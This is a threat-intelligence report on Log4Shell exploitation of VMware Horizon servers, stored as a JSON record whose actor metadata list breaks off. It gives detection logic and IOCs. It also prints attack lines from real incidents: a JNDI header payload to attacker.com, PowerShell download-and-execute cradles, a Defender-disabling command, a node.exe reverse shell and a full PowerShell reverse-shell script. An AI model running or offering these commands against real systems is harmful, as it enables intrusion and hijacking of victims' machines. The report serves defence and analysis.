{
    "id": "c8d55379-40ea-4699-8679-8d241a491267",
    "created_at": "2023-01-12T15:03:00.144835Z",
    "updated_at": "2025-03-27T02:17:01.464528Z",
    "deleted_at": null,
    "sha1_hash": "434bafb13939fd216b92c8e7c67539e3f9caac7f",
    "title": "2022-01-25 - Threats Looming Over the Horizon",
    "authors": "",
    "file_creation_date": "2022-05-28T23:21:03Z",
    "file_modification_date": "2022-05-28T23:21:03Z",
    "file_size": 5870030,
    "plain_text": "# Threats Looming Over the Horizon\n\n**cynet.com/attack-techniques-hands-on/threats-looming-over-the-horizon/**\n\n_By: Orion Threat Research and Intelligence Team_\n\n**HorizonBackdoor – Log4Shell vulnerability leads to VMware Horizon Servers exploitation**\n\nBased on several incident response investigations, Cynet has detected active exploitations of the Log4Shell vulnerability on VMware Horizon\n**Servers by different threat actors who deployed Cobalt Strike beacons, Cryptominers, and fileless reverse shells.**\n\nAdditional indicators point to the Night Sky ransomware group and Memento ransomware.\n\n## Prologue\n\nLog4j is an open-source logging framework distributed by Apache group that is widely used by well-known public services and roughly onethird of the world’s web servers.\n\n[On December 9, 2021, an RCE (Remote Code Execution) vulnerability was disclosed within the log4j package (CVE-2021-44228,](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) CVE-202145046) which allows an attacker to execute arbitrary code on machines that utilize the logging functionality of the log4j package giving the\nvulnerability its common name: Log4Shell.\n\n[For additional information and details please visit our Log4Shell Explained webpage.](https://www.cynet.com/log4shell/)\n\nAttack scenario example:\n\nLog4Shell JNDI attack – An attacker can craft the following HTTP header and send it to the target application:\n\n\n**GET / HTTP/1.1**\n**Host: vulnerable.com**\n\n**User-Agent: ${jndi:ldap://attacker.com/path/to/malicious/Java_class}**\n\n\nBy using the technique above to exploit the vulnerability, a\nsimple Python script can be used to trigger an RCE on a\nvulnerable server:\n\n\n-----\n\n[Another example of the Log4Shell JNDI attack is demonstrated by the Swiss Government CERT:](https://govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)\n\n[Following the Log4Shell exploits, VMware reported that several of its products were vulnerable. You can find the full list here.](https://www.vmware.com/security/advisories/VMSA-2021-0028.html)\n\nOne of the reported products is VMware Horizon, which is being used for digital workspaces that offer virtual desktops and apps across the\n[cloud. You can find a VMware disclosure report here.](https://kb.vmware.com/s/article/87073)\n\n**Timeline of Log4Shell and VMware Horizon exploitation:**\n\n**December 9th, 2021 – Log4j vulnerabilities were discovered and classified with the CVSS score of 10 (Critical).**\n**December 10th, 2021 – VMware reported on Apache Log4j Remote Code Execution Vulnerabilities on several products.**\n**Starting January 1st, 2022 – The Cyber Security community began reporting on threat actors who are actively trying to exploit VMware**\nHorizon while abusing the log4j vulnerability. In these exploitation attempts, threat actors were using the log4j vulnerability found in the\nApache Tomcat service embedded in VMware Horizon.\n\nVMware has published recommendations & mitigation steps for the vulnerability, including patches:\n\n[https://kb.VMware.com/s/article/87073](https://kb.vmware.com/s/article/87073)\n\n**Downloads** **Release Notes**\n\n[Horizon 2111](https://customerconnect.vmware.com/downloads/info/slug/desktop_end_user_computing/vmware_horizon/2111) [VMware Horizon 8 2111 Release Notes](https://docs.vmware.com/en/VMware-Horizon/8%202111/rn/vmware-horizon-8-2111-release-notes/index.html)\n\n\n-----\n\n[Horizon 7.13.1](https://customerconnect.vmware.com/downloads/info/slug/desktop_end_user_computing/vmware_horizon/7_13) [VMware Horizon 7 version 7.13.1 Release Notes](https://docs.vmware.com/en/VMware-Horizon-7/7.13.1/rn/horizon-7131-view-release-notes.html)\n\n[Horizon 7.10.3](https://customerconnect.vmware.com/downloads/info/slug/desktop_end_user_computing/vmware_horizon/7_10) [VMware Horizon 7 version 7.10.3 Release Notes](https://docs.vmware.com/en/VMware-Horizon-7/7.10.3/rn/horizon-7103-view-release-notes.html)\n\n## Case Overview:\n\nAt the beginning of January 2022, Cynet’s Orion threat research and intelligence team observed threat actors abusing the Apache Tomcat\nservice and utilizing the Log4Shell vulnerability to exploit VMware Horizon servers to gain initial access to the environment.\n\nThe threat actors deployed additional payloads and established communication to C2 servers, Cobalt Strike beacons, Cryptominers, etc.\n\nBased on the IOCs (indicators of compromise) and the TTPs (tactics, techniques, and procedures) observed, we believe that Chinese-based\nransomware operators dubbed Night Sky (and tracked by Microsoft as DEV-0401) is behind on some of the attacks.\n\n[On January 11th, Bleeping computer reported “Night Sky ransomware uses Log4j bug to hack VMware Horizon servers“.](https://www.bleepingcomputer.com/news/security/night-sky-ransomware-uses-log4j-bug-to-hack-vmware-horizon-servers/)\n\nIn addition to the Chinese-based ransomware operators, we observed unknown threat actors using Cobalt Strike on vulnerable VMware\nHorizon servers.\n\nThese unknown threat actors abused PowerShell to load and inject a fileless beacon into the memory.\n\nWe have also responded to an incident where threat actors attempted to establish a reverse shell session through a PowerShell command.\n\nAccording to our observations, in all these cases the process ws_tomcatservice.exe was involved.\n\n**Path: c:\\program files\\VMware\\VMware view\\server\\bin\\ws_tomcatservice.exe**\n**Command-line: ws_TomcatService.exe” -SCMStartup TomcatService**\n\nFrom our IR case, here are some examples of ws_tomcatservice.exe executing PowerShell encoded commands:\n\nFollowing this information and the execution commands via the ws_tomcatservice.exe process, the threat actors automatically gained system\nprivileges (nt authority – system).\n\n\n-----\n\n## Detection logic suggestions:\n\nThe first detection suggestion is based on the above information:\n\n[MITRE reference: TA0001 (Initial Access), T1190 (Exploit Public-Facing Application)](https://attack.mitre.org/tactics/TA0001)\n\n**Parent process name: ws_tomcatservice.exe**\n**Parent process path: %ProgramFiles%\\VMware\\VMware View\\Server\\***\n**Child process: CMD or PowerShell**\n\nIn addition, we recommend monitoring all known LOLBins (Living Off the Land Binaries) that allow download or execution\nmethods.\n\nNote that the community shared a Sigma rule which covers a similar logic:\nhttps://github.com/SigmaHQ/sigma/blob/70deac624004fd9d3c0326cd897042b5f5bc574b/rules/windows/process_creation/win_webshell_spa\nwn.yml#L20\n\nWe observed threat actors that carried out research on the “VMware View” installation and noticed that one of the binaries being installed as\npart of “VMware View” is node.exe.\nThis binary allows threat actors to use it as a LOLBin for the execution flow.\n\n**Path: C:\\Program Files\\VMware\\VMware View\\Server\\appblastgateway\\node.exe**\n\nThe node.exe process executed cmd.exe as part of the exploitation:\n\nThe full kill-chain flow from our logs:\n\n**Grandparent process: c:\\program files\\VMware\\VMware view\\server\\bin\\ws_tomcatservice.exe**\n\n**Parent process: c:\\program files\\VMware\\VMware view\\server\\appblastgateway\\node.exe**\n\n**Process: c:\\windows\\system32\\cmd.exe**\n\nBased on this information, we have created another detection logic suggestion:\n\n[MITRE reference: TA0001 (Initial Access), T1190 (Exploit Public-Facing Application)](https://attack.mitre.org/tactics/TA0001)\n\n**Grandparent process: ws_tomcatservice.exe**\n**Grandparent process path: %ProgramFiles%\\VMware\\VMware View\\Server\\***\n**Parent process: node.exe**\n**Parent process path: %ProgramFiles%\\VMware\\VMware View\\Server\\***\n**Parent process command-line contains: -e or –eval**\n**Child process: CMD or PowerShell**\n\nIn addition, we recommend monitoring all known LOLBins (Living Off the Land Binaries) that allows download or execution\nmethods.\n\nBelow we will cover several cases of VMware Horizon exploitation attempts.\n\n**[Initial Access – TA0001 (Initial Access), T1190 (Exploit Public-Facing Application)](https://attack.mitre.org/tactics/TA0001)**\n\nBased on MITRE ATT&CK, the incidents started with the “Exploit Public-Facing Application” technique against the VMware Horizon servers,\nwhich is part of the “Initial Access” tactic.\n\nIn case #1 below, we cover the XMRig crypto-mining trojan. In addition, to the installation of the XMRig, we have also identified indicators that\nlead us to conclude that the threat actors behind the incident are related to the Night Sky ransomware group (Case 1.1).\n\n## Case 1 – XMRig:\n\nXmrig.exe is part of XMRig open-source CPU/GPU cryptocurrency mining software. XMRig is known as an easy-to-use miner, offering userfriendly options to configure the miner according to the user’s preferences.\n\nThis incident was detected on Windows Server 2016 Standard x64 and Windows Server 2019 Standard x64, both of which are VMware\nHorizon servers.\n\nExecution flow:\n\n\n-----\n\n**Parent process: c:\\program files\\VMware\\VMware view\\server\\bin\\ws_tomcatservice.exe**\n**Child process: cmd /C ‘powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand**\nJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7A\n\nA CMD instance executed via the ws_tomcatservice.exe process with a /C parameter that executes a PowerShell command encoded in\nBase64. The PowerShell instance is executed with the following parameters:\n\n-ExecutionPolicy Bypass; Ignores the execution policy restriction and runs the code without any warning.\n-NoLogo; Hides the copyright banner at startup.\n-NonInteractive; Does not present an interactive prompt.\n-NoProfile; Does not load the PowerShell profile.\n-WindowStyle Hidden; Hides the PowerShell window.\n-EncodedCommand; Executes an encoded base64 command.\n\nThe decoded command:\n\n$wc = New-Object System.Net.WebClient;\n$tempfile = [System.IO.Path]::GetTempFileName();\n\n$tempfile += ‘.bat’;\n\n$wc.DownloadFile(‘http://72.46.52[.]135/mad_micky[.]bat’, $tempfile);\n\n& $tempfile\n\nThe above command uses System.Net.WebClient Class to access a web page, in our case the C2 server 72.46.52[.]135.\n\nThe command downloads the file “mad_micky.bat” and overwrites a file located in the %temp% directory.\n\nWe downloaded mad_micky.bat for further analysis:\n\nmad_micky.bat – Batch file including malicious content.\n\nFirst, the malicious batch file provides an indication on a PowerShell command that disables the real time monitoring in Windows.\n\nLine 2: Powershell -c “Set-MpPreference -DisableRealtimeMonitoring $true”\n\n[The above command is related to the Impair Defenses technique – MITRE T1562.](https://attack.mitre.org/techniques/T1562/)\n\nThreat actors disabled Windows Defender real-time monitoring in order to prepare the compromised host for the next stage of payloads.\n\nThen, it checks whether following path exists:\n\n%USERPROFILE%\\mimu1 – C:\\users\\{current_user}\\mimu1\n\n**If the condition is met, the flow “exist1” is taken – It checks whether the process “xmrig.exe” is running, and if it is running, it prints “now is**\nrunning”.\n\n**If the condition is not met, the flow “exist” is chosen – Using “[System.IO.Path]::GetTempFileName()”, it creates a temp file from in the**\nAppData\\Loca\\Temp\\ directory and assigns it to the variable $tempfile.\n\n\n-----\n\nThe temporary file is used to contain the payload which is downloaded from the following URL:\n\nhxxp://72.46.52[.]135/mad[.]bat\n\nAfter the payload (which now resides in the temporary file) is downloaded, it gets executed and than deleted from disk.\n\nAs you can see in the image below, the downloaded payload – (batch file), contains the XMRig miner configuration:\n\n\n-----\n\nThe code above indicates the mining of the Monero cryptocurrency.\n\nIf the victim has user privileges, the miner achieves persistence by copying the miner batch file from %userprofile%\\mimu\\miner.bat to the\nstartup folder.\n\n%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n\n%userprofile%\\Start Menu\\Programs\\StartUp\n\n[The above activity is related to the MITRE sub-technique “Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder”](https://attack.mitre.org/techniques/T1547/001/)\n\nIf the victim has admin privileges, the miner installs a service for the miner by using PowerShell to download additional tools from\nhxxp://lurchmath[.]org/wordpress-temp/wp-content/plugins/nssm[.]zip\n\nTo setup the miner (mimu_miner) service, it downloads the tool to %userprofile% path as a zip file: “%userprofile%\\nssm.zip”\n\nnssm.zip – Non-Sucking Service Manager (NSSM) is a service helper program that assists in installing an application as a service.\n\nThen it extracts the zip file to the ““%userprofile%\\mimu”,\n\n\n-----\n\nIf extracting the zip file fails, it downloads the 7zip (7za.exe) tool in order to succeed in unpacking/unziping the nssm.zip file.\n\nIt then uses the nssm-service manager tool to create the service “mimu_miner” to execute \\mimu\\xmrig.exe\n\nIf the creation fails, it attempts to create mimu_miner as AppDirectory service.\n\n[MITRE Sub-Technique “Create or Modify System Process: Windows Service”](https://attack.mitre.org/techniques/T1543/003/)\n\nIn addition, the XMRig miner configuration is revealing the attacker’s dedicated Monero pool.\n\n\n-----\n\nDuring the investigation, we have observed the IP address 195.201.124[.]214, which is a mining pool address for the miner configuration\nrelated to MoneroOceans mining pools.\n\nAccording to VirusTotal, the IP address is indeed related to the “MoneroOceans.stream” domain.\n\n\n-----\n\n-----\n\nReference:\n\n[https://moneroocean.stream/](https://moneroocean.stream/)\n\n[https://old.moneroocean.stream/#/dashboard](https://old.moneroocean.stream/#/dashboard)\n\n[https://github.com/xmrig/xmrig/](https://github.com/xmrig/xmrig/)\n\nUsing the pool address and the website related to it, we can get a better understanding of the attack scale:\n\nThe pool was created on January 14th, it is comprised of 773 infected machines, dedicating parts of their CPU to the threat actors pool, and it\nis currently running at a rate of 0.5 XMR (Aprox 30$) per day.\n\nIt is worth mentioning that threat actors usually lower their risk by setting up several pools for the same campaign.\n\nIn the next case, on the same compromised machines where the XMRig was installed,we observed the following command execution:\n\n## Case 1.1 – Cryptominer for Linux:\n\ncmd /C ‘curl 72.46.52[.]135/dl[.]sh | bash’\n\nHere, the C2 server responds with “Not Found” and the file dl.sh is not available on the C2 server.\n\n\n-----\n\nBut navigating to the IP address reveals the following MoneroOcean setup script:\n\n[https://github.com/MoneroOcean/xmrig_setup/blob/master/setup_moneroocean_miner.sh](https://github.com/MoneroOcean/xmrig_setup/blob/master/setup_moneroocean_miner.sh)\n\nBased on a VirusTotal search, we see that this IP was mentioned by the community: “Seeing this hit public-facing Horizon server”.\n\nAccording to the VirusTotal search, we have observed that the dl.sh file is in the relations tab:\n\n\n-----\n\nIn this case, dl.sh seems to be targeting hosts that have WSL (Windows Subsystem for Linux).\n\nThis makes monitoring and detection a bit more complex as it hides its activity behind the virtualization layer of the Linux guest.\n\nAs part of its flow, the script transfers execution to other scripts it downloads. All the scripts will perform similar actions and, after performing\ncertain checks, they drop the XMRig cryptominers on the victim’s machine. The main activities of these scripts are:\n\nRemoving system artifacts that are related to cryptomining activity:\n\nProcesses\nCron jobs\nFiles and directories\n\nCleaning and removing artifacts from system logs:\n\nDropping and executing their own XMRig cryptominers\n\n**Extracted IOCs:**\n\nIOC Category SHA256 URL\n\n\n-----\n\ndl.sh Script 37A794E32F58E40658CDABBE16CD6B9EFB807B66ECD19C352FE7769D000E5AFE hxxp[://]72[.]46[.]5\n\ndm.sh Script 5EC113EDE6F48CD2A4F6A6233E8D58DA4A6EB276D8689CF0BAE49EA2F269C23A hxxp[://]72[.]46[.]5\n\n\nrodolf.sh Script 961B153F31DC9B75F6C5F14DDE1D1676DF77647651A03C39ADBB91F08D4CB3E2\nA4EA19B36DA84E5BE9635AB76E9EDA1E22F55C95344B969EFC147CF547FB2046\n\n\nhxxp[://]72[.]46[.]5\nhxxps[://]41[.]157[\n\n\nstatic.sh Script 581513FBEDB4C28E63F9D91625B032EFC82AEB849086BCB0469081CDF830256C hxxps[://]41[.]157[\n\nafghan Cryptominer 6E4B708017992A4600A644660B82C1068BECB1C1D1212A70A14BBE89C3B211FD hxxp[://]72[.]46[.]5\nhxxps[://]41[.]157[\n\n\njuma Cryptominer EF11C120FAB2129FCE6DDDB8B007102EF98281E11864386FF09C179C58D1DFE0\nB2E2FE9E6DDBD05B8113419283B4C4E7AEBF4ACE21C0892545B1521936EBD3D6\n\n107[.]191[.]63[.]34 IP\n\n72[.]46[.]52[.]135 IP\n\n41[.]157[.]42[.]239 IP\n\n207[.]38[.]87[.]6 IP\n\n/tmp/.shanbe/ Directory\n\n\nhxxps[://]41[.]157[\nhxxps[://]41[.]157[\n\n\nAs we continued monitoring the infected host, we observed that the threat actors executed other shell commands. In case 1.2, we cover the\nnode.exe process that was abused by the threat actors as a LOLBin.\n\n## Case 1.2 – VMware node.exe abuse:\n\n‘C:\\Program Files\\VMware\\VMware View\\Server\\appblastgateway\\node.exe’ -r net -e ‘sh = require(‘child_process’).exec(‘cmd.exe’);var\nclient = new net.Socket();client.connect(8853, ‘66.42.36[.]178′, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});’\n\nThe above command was executed through the ws_tomcatservice.exe process:\n\n**Parent process: c:\\program files\\vmware\\vmware view\\server\\bin\\ws_tomcatservice.exe**\n**Child process: C:\\Program Files\\VMware\\VMware View\\Server\\appblastgateway\\node.exe**\n\nThe JavaScript command opened a connection to ‘66.42.36[.]178’ on port 8853 and opened a reversed shell via cmd.exe.\n\nAs mentioned above, we researched the “VMware View” environment and noticed that one of the binaries being installed as part of “VMware\nView” is node.exe which can be abused in order to execute JavaScript commands.\n\nWe are still investigating this case and will publish more details and IOCs when our investigation is completed.\n\nIn case 1.3, we spotted another Cryptominer deployment attempt:\n\n## Case 1.3 – XMS XMRig\n\nThe following command was executed on the infected host:\n\npowershell iex(New-Object Net.WebClient).DownloadString(‘http://80.71.158[.]96/xms[.]ps1’)\n\nxms.ps1 content:\n\n\n-----\n\nThe main functionality of the script:\n\n[Downloads files and saves them as $env:Appdata\\network02.exe and $env:TMP\\network02.exe (MITRE: Ingress Tool Transfer T1105).](https://attack.mitre.org/techniques/T1105/)\n[Disable all firewall profiles via netsh (MITRE: Impair Defenses: Disable or Modify System Firewall T1562.004).](https://attack.mitre.org/techniques/T1562/004/)\n[Network discovery via netstat (MITRE: System Network Connections Discovery T1049).](https://attack.mitre.org/techniques/T1049/)\n[Creation of a scheduled task via schtasks command (MITRE: Scheduled Task/Job: Scheduled Task T1053.005).](https://attack.mitre.org/techniques/T1053/005/)\nAchieves persistence by creating a Run key in the Registry via reg command (MITRE: Boot or Logon Autostart Execution: Registry Run\nKeys / Startup Folder T1547.001)\n\nThe downloaded payload is XMRig miner:\n\nSHA256: 0663d70411a20340f184ae3b47138b33ac398c800920e4d976ae609b60522b01\nSSDeep: 98304:Hf8WSHqjQrScap+JvvW8vCeNDzml+UxHVP9kfYs:kprvvdvCeNe+Ux1qfYs\n\n\n-----\n\nAfter covering the TTPs the threat actors utilized to deploy the XMRig miner, they executed another interesting command which leads us to\ncase 1.4:\n\n## Case 1.4 – Night Sky ransomware group operation\n\n[According to this report by Microsoft, the attackers are using C2 servers that spoof a legitimate domain, api[.]rogerscorp[.]org, using the](https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/)\nfollowing command:\n\npowershell -c curl -uri http://api[.]rogerscorp[.]org:80 -met POST -Body\n([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((echo [IP Of the Victim])))))\n\nThe above PowerShell command executed curl command to send the victim’s external IP address via a POST request to the\n_http://api.rogerscorp[.]org domain over port 80._\n\nMicrosoft Security Intelligence’s tweet:\n\nVirusTotal community comments:\n\n\n-----\n\nNight Sky was first observed at the end of 2021 while being distributed by a Chinese-based ransomware operator. The threat actors exploit\nLog4j CVE-2021-44228 and CVE-2021-45046 on VMware Horizon machines.\n\n[The Night Sky ransomware was first spotted by MalwareHunterTeam on Jan 1th.](https://twitter.com/malwrhunterteam/status/1477381209147723788)\n\nThe Night Sky ransomware group threatens its victims with the double extortion model. It allows the threat actors to get hold of the victim’s\nassets and demand ransom for their decryption, while also exfiltrating data and threatening the victim that the data will be forever gone, sold\nor published to the public if he fails to meet their ransom demands.\n\n\n-----\n\na t o t e ote (doub e e to t o )\n\n“we will decrypt the data and destroy the stolen data without leaking the data.”\n\nNight Sky leak site:\n\nThe ransomware encryption method: AES-128 algorithm\nThe ransomware extension: .Night Sky\nThe ransomware note: Night SkyReadMe.hta\nThe ransomware does not encrypt: .dll, .exe\n\n\n-----\n\n## Discovery\n\nWhen examining the discovery command on the compromised machines, we noticed that the following commands were being executed via\nWindows legitimate binaries:\n\nnet session\n\ntasklist\n\nipconfig /all\n\nNslookupNetstat -ano\n\nnltest\n\nThe above discovery commands are executed via the node.exe process using the following execution:\n\n**GrandParent process: c:\\program files\\vmware\\vmwareview\\server\\bin\\ws_tomcatservice.exe**\n**Parent process: c:\\program files\\vmware\\vmware view\\server\\appblastgateway\\node.exe**\n\n**Process: [The above commands, net, tasklist, ipconfig…]**\n\nNext, we cover an Incident response case where Cobalt Strike was executed following a Log4shell exploitation.\n\n## Case 2 – Cobalt Strike\n\nIn this case, we detected the following execution flow:\n\n**Parent process: c:\\program files\\vmware\\vmware view\\server\\bin\\ws_tomcatservice.exe**\n**Child process: powershell.exe -exec bypass -enc**\naQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC\n\nThe decoded PowerShell base64 command:\n\niex ((New-Object System.Net.WebClient).DownloadString(‘http://185.112.83[.]116:8080/drv’))\n\nThe command above is a simple fileless PowerShell execution that utilizes the IEX cmdlet in order to execute the malicious content that is\nretrieved from ‘hxxp://185[.]112[.]83[.]116:8080/drv’ by the DownloadString method.\n\nThe malicious URL leads to an obfuscated PowerShell script that contains a lot of “junk” strings:\n\n\n-----\n\nAfter decoding the PowerShell code, we found a Base64 encoded code. This chunk of code is part of a Cobalt Strike shellcode:\n\n\n-----\n\nThe Base64 block encrypted with bxor (XOR) with a key of 35 (Decimal).\n\n\n-----\n\nWe extracted the Cobalt Strike shellcode by using the following CyberChef recipe:\n\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64(‘A-Za-z09%2B/%3D’,true)XOR(%7B’option’:’Decimal’,’string’:’35’%7D,’Standard’,false):\n\n\n-----\n\nIn the next stage, the shellcode executes the rundll32.exe process (by default) and injects the CS beacon into it. We observed additional\nprocesses which could be executed during a Cobalt Strike infection.\n\nProcesses that could be potentially involved in a CS injection:\n\n\\sysnative\\dllhost.exe\n\n\\sysnative\\wuauclt.exe\n\n\\sysnative\\esentutl.exe\n\n\\sysnative\\werfault.exe\n\n\\sysnative\\regsvr32.exe\n\n\\sysnative\\userinit.exe\n\n\\sysnative\\mstsc.exe\n\n\\sysnative\\net.exe\n\n\\sysnative\\svchost.exe\n\n\\sysnative\\gpupdate.exe\n\n\\sysnative\\lsass.exe\n\n\\sysnative\\searchindexer.exe\n\nThe common pattern for these processes is that when Cobalt Strike injects the code, these processes are executed without any commandline parameters. This is very suspicious. For example, regsvr32 or werfault that are being executed without any command line parameters is\nconsidered an anomaly as this behavior won’t be observed as part of a normal operating system activity. Additionally, in most cases, the\ninjecting process also contains a new memory page with RWX permissions and the content of this page is a PE code. Note that the threat\nactors could also use only RX memory permissions.\n\n[stage.userwx – “This setting is a Boolean and informs the default loader to either use RWX or RX memory.](https://www.cobaltstrike.com/blog/user-defined-reflective-loader-udrl-update-in-cobalt-strike-4-5/)\n\nAt runtime Beacon will either include or not include the .text section for masking. If the setting is set to TRUE, your user defined loader needs\nto set the protection on the .text section as RWX otherwise Beacon will crash. If the setting is set to FALSE, your user defined loader should\nset the protection on the .text section as RX as the .text section will not be masked.”\n\nThe next case will cover another IR incident where the threat actors executed a reverse shell via PowerShell script that is inspired by the\nMetasploit framework.\n\n## Case 3 – Metasploit PS Reverse Shell\n\nWe will cover the PowerShell reverse shell script and explain each line in the code in order to best understand of the functionality the script\nand how it works.\n\nThe execution flow:\n\n\n-----\n\n**Parent process: c:\\program files\\vmware\\vmware view\\server\\bin\\ws_tomcatservice.exe**\n**Child process: powershell -nop -ec**\nJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0\n\nThe following PS script is the decoded Base64 command:\n\n$client = New-Object System.Net.Sockets.TCPClient(“142.44.251[.]77”,4445);\n\n$stream = $client.GetStream();\n\n[byte[]] $bytes = 0..65535 | %{0};\n\nwhile (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { ;\n\n$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n\n$sendback = (iex $data 2>&1 | Out-String );\n\n$sendback2 = $sendback + “PS ” + (pwd).Path + “> “;\n\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n\n$stream.Write($sendbyte,0,$sendbyte.Length)\n\n$stream.Flush()\n\n};\n\n$client.Close()\n\n\n-----\n\nInspired by a PowerShell implementation of a reverse shell from the Metasploit framework (https://github.com/rapid7/metasploitframework/blob/389fd55952a18dcddc072c9f5fde0c474da3401d/data/exploits/powershell/powerfun.ps1)\n\nComment that implies the IP is related to an exploitation in-the-wild of the Log4J vulnerability.\n\nAt the time of writing, the server is refusing connections:\n\nAssumption: The server is missing some information about the host (Which should be collected prior to the reverse shell session), and thus it\nwon’t accept the connection.\n\nWe detected another similar attempt of reverse shell execution via a similar PowerShell script and in this case, we were able to receive a\nconnection to the C2 server:\n\n## Case 3.1 – Metasploit PS Reverse Shell potentially related to Memento ransomware\n\nIn the screenshot below, we can see the PS script and the $data variable input that was received from the C2 server; cmd.exe /k whoami\ncommand:\n\nThe $sendback2 variable contains the cmd.exe /k whoami output which should be sent to the C2 server.\n\nThe above IP “190.144.115[.]54” has a bad reputation in VT and the community links this IP to the Memento ransomware:\n\n\n-----\n\n## Indicator of Compromise:\n\n**XMRig C2 server:**\n\n72.46.52[.]135\n\nhxxp://72.46.52[.]135/mad_micky[.]bat\n\nhxxp://72.46.52[.]135/mad[.]bat\n\n141.85.161[.]18\n\nhxxp://141.85.161[.]18/kill[.]bat\n\nhxxp://141.85.161[.]18/mad_micky[.]bat\n\n80.71.158[.]96\n\nhxxp://80.71.158[.]96/xms[.]ps1\n72.46.52[.]135\n\n72.46.52[.]135/dl[.]sh\n\n195.154.187[.]240\n\nhxxp://195.154.187.240/2[.]ps1\n\n51.222.121[.]180\n\nhxxp://51.222.121[.]180:82/kill[.]bat\n\n**Unknown C2:**\n\nIP: 66.42.36[.]178 Port: 8853\n\nIP: 142.44.251[.]77 Port: 4445\n\nIP: 190.144.115[.]54 Port: 4545\n\n**Potenteltliy realted to Night Sky ransomware:**\n\napi[.]rogerscorp[.]org\n\nhxxp://api[.]rogerscorp[.]org:80\n\n**Cobalt Strike C2:**\n\n185.112.83[.]116\n\nhxxp://185.112.83[.]116:8080/drv\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-25 - Threats Looming Over the Horizon.pdf"
    ],
    "report_names": [
        "2022-01-25 - Threats Looming Over the Horizon.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "81e29474-63ad-4ce8-97db-b1712d5481d5",
            "created_at": "2024-04-24T02:00:49.570158Z",
            "updated_at": "2025-03-27T02:00:55.49842Z",
            "deleted_at": null,
            "main_name": "Cinnamon Tempest",
            "aliases": [
                "Cinnamon Tempest",
                "DEV-0401",
                "Emperor Dragonfly",
                "BRONZE STARLIGHT"
            ],
            "source_name": "MITRE:Cinnamon Tempest",
            "tools": [
                "Pandora",
                "PlugX",
                "Cheerscrypt",
                "Impacket",
                "Cobalt Strike",
                "HUI Loader",
                "Rclone"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6eabf1ca-1d3a-4c27-893e-c4e0eb58e285",
            "created_at": "2024-06-04T02:03:07.737006Z",
            "updated_at": "2025-03-27T02:05:17.29122Z",
            "deleted_at": null,
            "main_name": "BRONZE STARLIGHT",
            "aliases": [
                "DEV-0401 "
            ],
            "source_name": "Secureworks:BRONZE STARLIGHT",
            "tools": [
                " Cobalt Strike",
                " HUI Loader",
                " LockFile",
                " NightSky",
                " Pandora",
                " PlugX",
                " Rook",
                "AtomSilo"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f63c346d-18c8-4821-a56d-fefb1ad7ed5d",
            "created_at": "2022-10-25T16:07:23.42507Z",
